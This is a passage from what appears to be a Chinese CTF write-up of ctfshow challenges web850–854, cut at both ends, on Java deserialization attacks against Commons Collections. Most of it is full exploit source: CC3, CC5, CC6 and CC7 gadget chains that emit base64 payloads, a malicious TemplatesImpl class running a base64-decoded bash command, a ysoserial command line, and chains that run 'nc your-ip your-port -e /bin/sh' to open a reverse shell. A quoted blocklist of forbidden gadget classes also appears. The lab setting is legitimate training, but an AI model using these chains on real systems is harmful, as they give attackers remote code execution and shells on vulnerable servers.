class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        <span class="comment">// 1. 加载恶意类</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;evo1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;target/classes/com/ctfshow/payload.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 其实_tfactory在readObject中会被赋值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. ysoserial中的CC3，使用InstantiateTransformer和TrAXFilter</span></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">// ConstantTransformer最后调用时需要，前面按流程写链子时可先不写</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 注解可以乱填，因为动态代理的invoke只需要在readObject种执行一个无参方法即可触发，不需要过后面的判断</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="comment">// 这里动态代理一个LazyMap可以实现readObject-&gt;invoke-&gt;get</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Override.class,mapProxy);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payloadBytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BASE64Encoder</span>().encode(payloadBytes);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恶意类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctfshow;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在defineTransletClasses中要满足superClass.getName().equals(ABSTRACT_TRANSLET)</span></span><br><span class="line"><span class="comment">// 所以这里要继承下AbstractTranslet</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">payload</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,你要执行的命令的base64&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以直接用工具打（前面的题目也是）</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsCollections3 <span class="string">&quot;bash -c &#123;echo,你要执行的命令的base64&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>|<span class="built_in">base64</span></span><br></pre></td></tr></table></figure><p>接下来就要记录下我做这道题无语的经历，当我用自己的CC3打不通，用工具的CC3可以打通的时候，事情就开始变味了，首先对比了下报错，报错这里不一样</p><p><img src="https://cdnjson.com/images/2023/08/26/web850.png" alt="web850.png"></p><p>然后下载对应源码看一下（服务器的Java版本是1.7.0_55）。发现本来应该一直执行到第二个框的，但我的payload进入了第一个框就停了</p><p><img src="https://cdnjson.com/images/2023/08/26/web850-1.png" alt="web850-1.png"></p><p>然后第一个框的作用主要是给<code>_class</code>赋值为我们定义的恶意类，可以看到Java7的是可以成功赋值的</p><p><img src="https://cdnjson.com/images/2023/08/26/web850-2.png" alt="web850-2.png"></p><p>而使用Java8版本的payload时，会出现问题</p><p><img src="https://cdnjson.com/images/2023/08/26/web850-3.png" alt="web850-3.png"></p><p>在这一步<code>defineClass</code>加载字节码时，会捕获到异常</p><p><img src="https://cdnjson.com/images/2023/08/26/web850-4.png" alt="web850-4.png"></p><p>搜一下报错就可以知道，是Java版本问题在捣鬼。所以，一定要保持和远程一样的版本再做题，仔细读题，不然就会和我一样找bug到半夜，还是太菜了呀我&#x2F;(ㄒoㄒ)&#x2F;~~</p><h2 id="web851"><a href="#web851" class="headerlink" title="web851"></a>web851</h2><p>题目提示<code>有nc</code>，然后描述有<code>我是java8，使用了commons-collections 4.0的库并对一些可能有危险的类进行了封禁</code>，应该是原来的CC2和CC4不能用了</p><h3 id="CC7改"><a href="#CC7改" class="headerlink" title="CC7改"></a>CC7改</h3><p>拿CC7改一下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> show.ctf.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">web851</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;nc your-ip your-port -e /bin/sh&quot;</span>&#125;)</span><br><span class="line"><span class="comment">//                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 先传进来一个空的，防止在put里面的equals触发</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在java中yy和zZ的hashCode是一样的</span></span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap1 = LazyMap.lazyMap(hashMap1,chainedTransformer);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap2 = LazyMap.lazyMap(hashMap2,chainedTransformer);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> chainedTransformer.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">iTransformers</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        iTransformers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iTransformers.set(chainedTransformer,transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// LazyMap.get中会多生成一个yy</span></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashtable);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payloadBytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(payloadBytes);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line"><span class="comment">//        serialize(hashtable);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CC6改"><a href="#CC6改" class="headerlink" title="CC6改"></a>CC6改</h3><p>同理其他基于<code>commons-collections3</code>的<code>Java8</code>的CC链理论上改成CC4也可以，看网上的题解也可以不用<code>LazyMap</code>改用<code>DefaultedMap</code>也是可以的，这里放一个改的<code>CC6</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> show.ctf.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">web851</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;nc your-ip your-port -e /bin/sh&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 改成ConstantTransformer是为了防止put的时候就被使用</span></span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.lazyMap(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;evo1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;evo2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化的时候需要这个key来过掉LazyMap.get中的map.containsKey(key) == false</span></span><br><span class="line">        <span class="comment">// 但是序列化后这个key会被放进去，所以需要再去掉</span></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;evo1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(map2);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payloadBytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(payloadBytes);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(map2);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web852"><a href="#web852" class="headerlink" title="web852"></a>web852</h2><p>同<code>web851</code></p><h2 id="web853"><a href="#web853" class="headerlink" title="web853"></a>web853</h2><p>用<code>web851</code>里的改的<code>CC6</code>会报类不支持的错，但是改的<code>CC7</code>还是可以用的</p><h2 id="web854"><a href="#web854" class="headerlink" title="web854"></a>web854</h2><p>题目给了更详细的信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">提交ctfshow参数进行base64解码</span><br><span class="line">然后进行反序列化</span><br><span class="line">我是java8，使用了commons-collections 4.0的库并对一些可能有危险的类进行了封禁，包含:</span><br><span class="line">TransformedMap</span><br><span class="line">PriorityQueue</span><br><span class="line">InstantiateTransformer</span><br><span class="line">TransformingComparator</span><br><span class="line">TemplatesImpl</span><br><span class="line">AnnotationInvocationHandler</span><br><span class="line">HashSet</span><br><span class="line">Hashtable</span><br><span class="line">LazyMap</span><br><span class="line"></span><br><span class="line">下面是我接收参数的代码</span><br><span class="line">data=new BASE64Decoder().decodeBuffer(request.getParameter(&quot;ctfshow&quot;));</span><br></pre></td></tr></table></figure><h3 id="CC5改"><a href="#CC5改" class="headerlink" title="CC5改"></a>CC5改</h3><p>看一下以前的链子发现可以改一下<code>CC5</code>，把里面的<code>LazyMap</code>换成<code>DefaultedMap</code>就行了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> show.ctf.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.DefaultedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">web854</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;nc your-ip your-port -e /bin/sh&quot;</span>&#125;)</span><br><span class="line"><span class="comment">//                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">DefaultedMap</span> <span class="variable">defaultedMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultedMap</span>(chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(defaultedMap,<span class="string">&quot;evo1&quot;</span>);</span><br><span 